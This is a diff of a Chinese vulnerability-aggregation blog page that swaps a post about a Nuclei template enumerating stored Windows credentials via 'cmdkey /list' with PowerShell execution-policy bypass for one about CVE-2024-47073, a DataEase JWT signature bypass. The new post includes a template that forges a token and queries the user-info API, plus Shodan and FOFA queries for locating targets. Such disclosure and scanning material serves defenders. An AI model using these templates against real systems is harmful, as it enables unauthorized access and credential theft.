@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Windows Get Stored Credentials - cmdkey Vulnerability 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。 产品厂商： Microsoft 产品名称： Wi">
+    <meta name="description" content="漏洞信息漏洞名称： DataEase JWT签名验证绕过漏洞 漏洞编号：  CVE： CVE-2024-47073  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： DataEase是一个开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势。在受影响版本中，由于JWT令牌缺乏签名验证，攻击者可以伪造JWT，从而允许访问任何接口。该漏洞已在v2.10.2版本中修复，建议所有用户升级。目前">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Windows Get Stored Credentials - cmdkey Vulnerability">
-<meta property="og:url" content="http://example.com/2025/06/12/github_281223188/index.html">
+<meta property="og:title" content="DataEase JWT签名验证绕过漏洞">
+<meta property="og:url" content="http://example.com/2025/06/12/github_1592714442/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Windows Get Stored Credentials - cmdkey Vulnerability 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。 产品厂商： Microsoft 产品名称： Wi">
+<meta property="og:description" content="漏洞信息漏洞名称： DataEase JWT签名验证绕过漏洞 漏洞编号：  CVE： CVE-2024-47073  漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： DataEase是一个开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势。在受影响版本中，由于JWT令牌缺乏签名验证，攻击者可以伪造JWT，从而允许访问任何接口。该漏洞已在v2.10.2版本中修复，建议所有用户升级。目前">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-12T10:45:23.433Z">
-<meta property="article:modified_time" content="2025-06-12T10:45:23.428Z">
+<meta property="article:published_time" content="2025-06-12T11:00:26.789Z">
+<meta property="article:modified_time" content="2025-06-12T11:00:26.797Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="信息泄露">
 <meta property="article:tag" content="projectdiscovery&#x2F;nuclei-templates:github issues">
+<meta property="article:tag" content="权限绕过">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Windows Get Stored Credentials - cmdkey Vulnerability - liancc&#39; infos blog</title>
+  <title>DataEase JWT签名验证绕过漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Windows Get Stored Credentials - cmdkey Vulnerability"></span>
+            <span id="subtitle" data-typed-text="DataEase JWT签名验证绕过漏洞"></span>
           
         </div>
 
@@ -213,7 +213,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-12 10:45" pubdate>
+        <time datetime="2025-06-12 11:00" pubdate>
           2025年6月12日 上午
         </time>
       </span>
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          161 字
+          372 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -273,20 +273,26 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Windows Get Stored Credentials - cmdkey Vulnerability</h1>
+            <h1 id="seo-header">DataEase JWT签名验证绕过漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Windows Get Stored Credentials - cmdkey Vulnerability</p>
-<p><strong>漏洞类型：</strong> 信息泄露</p>
-<p><strong>漏洞等级：</strong> 高危</p>
-<p><strong>漏洞描述：</strong> Windows中的cmdkey &#x2F;list命令用于列出系统上存储的所有凭据。这些凭据可能包括为网络资源、网站或远程计算机保存的用户名和密码，存在信息泄露的风险。</p>
-<p><strong>产品厂商：</strong> Microsoft</p>
-<p><strong>产品名称：</strong> Windows</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/697e27d60d3da75fc80782a72b85416fbd5f641d/code%2Fwindows%2Fget-stored-credentials-cmdkey.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/697e27d60d3da75fc80782a72b85416fbd5f641d/code%2Fwindows%2Fget-stored-credentials-cmdkey.yaml</a></p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> DataEase JWT签名验证绕过漏洞</p>
+<p><strong>漏洞编号：</strong></p>
+<ul>
+<li><strong>CVE：</strong> CVE-2024-47073</li>
+</ul>
+<p><strong>漏洞类型：</strong> 权限绕过</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> DataEase是一个开源的数据可视化分析工具，帮助用户快速分析数据并洞察业务趋势。在受影响版本中，由于JWT令牌缺乏签名验证，攻击者可以伪造JWT，从而允许访问任何接口。该漏洞已在v2.10.2版本中修复，建议所有用户升级。目前没有已知的临时解决方案。</p>
+<p><strong>产品厂商：</strong> dataease</p>
+<p><strong>产品名称：</strong> dataease</p>
+<p><strong>影响版本：</strong> * &lt;&#x3D; 2.10.2</p>
+<p><strong>搜索语法：</strong> http.html:”dataease” OR body&#x3D;”dataease”</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei-templates/blob/bf2067feb4f393237b9d911c46d9cf70deeb82df/http%2Fcves%2F2024%2FCVE-2024-47073.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/bf2067feb4f393237b9d911c46d9cf70deeb82df/http%2Fcves%2F2024%2FCVE-2024-47073.yaml</a></p>
 <p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p>
-<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><br><span class="hljs-attribute">id</span><span class="hljs-punctuation">:</span> <span class="hljs-string">get-stored-credentials-cmdkey</span><br><br><span class="hljs-attribute">info</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">name</span><span class="hljs-punctuation">:</span> <span class="hljs-string">Get Stored Credentials - cmdkey</span><br>  <span class="hljs-attribute">author</span><span class="hljs-punctuation">:</span> <span class="hljs-string">pussycat0x</span><br>  <span class="hljs-attribute">severity</span><span class="hljs-punctuation">:</span> <span class="hljs-string">high</span><br>  <span class="hljs-attribute">description</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>    <span class="hljs-attribute">The cmdkey /list command in Windows is used to list all the stored credentials on the system. These credentials can include saved usernames and passwords for network resources, websites, or remote computers</span><br><span class="hljs-attribute">  tags</span><span class="hljs-punctuation">:</span> <span class="hljs-string">code,windows,privesc,ps,enum</span><br><br><span class="hljs-attribute">self-contained</span><span class="hljs-punctuation">:</span> <span class="hljs-string">true</span><br><span class="hljs-attribute">code</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">engine:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">powershell</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">powershell.exe</span><br>    <span class="hljs-attribute">args</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">-ExecutionPolicy</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">Bypass</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">-File</span><br>    <span class="hljs-attribute">pattern</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*.ps1&quot;</span><br>    <span class="hljs-attribute">source</span><span class="hljs-punctuation">:</span> <span class="hljs-string">|</span><br>      <span class="hljs-attribute">cmdkey /list</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">    extractors</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">type: dsl</span><br>        <span class="hljs-attribute">dsl</span><span class="hljs-punctuation">:</span><br>          <span class="hljs-bullet">-</span> <span class="hljs-string">response</span><br><br><br></code></pre></td></tr></table></figure>
+<h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">47073</span><br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> DataEase v2.<span class="hljs-number">10.2</span> JWT Signature Verification Bypass<br>  <span class="hljs-params">author:</span> iamnoooob,pdresearch<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    DataEase is an open source data visualization analysis tool that helps users quickly analyze data and gain insights into business trends. In affected versions, the lack of signature verification of JWT tokens allows attackers to forge JWTs, which <span class="hljs-keyword">then</span> allow access to any interface. The vulnerability has been fixed <span class="hljs-keyword">in</span> v2.<span class="hljs-number">10.2</span> and all users are advised to upgrade. There are no known workarounds for this vulnerability.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2024-47073</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:N<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.1</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>4-<span class="hljs-number">47073</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">347</span><br>    <span class="hljs-params">epss-score:</span> <span class="hljs-number">0.00047</span><br>    <span class="hljs-params">epss-percentile:</span> <span class="hljs-number">0.14553</span><br>    <span class="hljs-params">cpe:</span> cpe:<span class="hljs-number">2.3</span>:a:dataease:dataease:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span>:<span class="hljs-operator">*</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">verified:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">vendor:</span> dataease<br>    <span class="hljs-params">product:</span> dataease<br>    <span class="hljs-params">shodan-query:</span> http.html:<span class="hljs-string">&quot;dataease&quot;</span><br>    <span class="hljs-params">fofa-query:</span> body<span class="hljs-operator">=</span><span class="hljs-string">&quot;dataease&quot;</span><br>  <span class="hljs-params">tags:</span> cve,cve2024,dataease,jwt<br><br><span class="hljs-params">variables:</span><br>  <span class="hljs-params">payload:</span> &#x27;&#123;<span class="hljs-string">&quot;uid&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;oid&quot;</span>:<span class="hljs-number">1</span>,<span class="hljs-string">&quot;exp&quot;</span>:&#123;&#123;unix_time(<span class="hljs-number">1000</span>)&#125;&#125;&#125;&#x27;<br>  <span class="hljs-params">token:</span> &#x27;&#123;&#123;generate_jwt(payload,<span class="hljs-string">&quot;HS256&quot;</span>,<span class="hljs-string">&quot;random&quot;</span>) &#125;&#125;&#x27;<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<span class="hljs-operator">+</span><br>        GET <span class="hljs-symbol">/de2api/user/info</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">X-DE-TOKEN:</span> &#123;&#123;token&#125;&#125;<br><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> data<br>          <span class="hljs-operator">-</span> &#x27;<span class="hljs-string">&quot;oid&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>&#x27;<br>          <span class="hljs-operator">-</span> code<br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>
 
 
                 
@@ -321,9 +327,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
-      
         <a href="/tags/projectdiscovery-nuclei-templates-github-issues/" class="print-no-link">#projectdiscovery/nuclei-templates:github issues</a>
+      
+        <a href="/tags/%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87/" class="print-no-link">#权限绕过</a>
       
     </div>
   
@@ -335,8 +341,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Windows Get Stored Credentials - cmdkey Vulnerability</div>
-      <div>http://example.com/2025/06/12/github_281223188/</div>
+      <div>DataEase JWT签名验证绕过漏洞</div>
+      <div>http://example.com/2025/06/12/github_1592714442/</div>
     </div>
     <div class="license-meta">
       
@@ -380,18 +386,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/12/github_1592714442/" title="DataEase JWT签名验证绕过漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">DataEase JWT签名验证绕过漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/12/github_1329821886/" title="CVE-2025-32711 Exploit">
-                        <span class="hidden-mobile">CVE-2025-32711 Exploit</span>
+                      <a href="/2025/06/12/github_281223188/" title="Windows Get Stored Credentials - cmdkey Vulnerability">
+                        <span class="hidden-mobile">Windows Get Stored Credentials - cmdkey Vulnerability</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
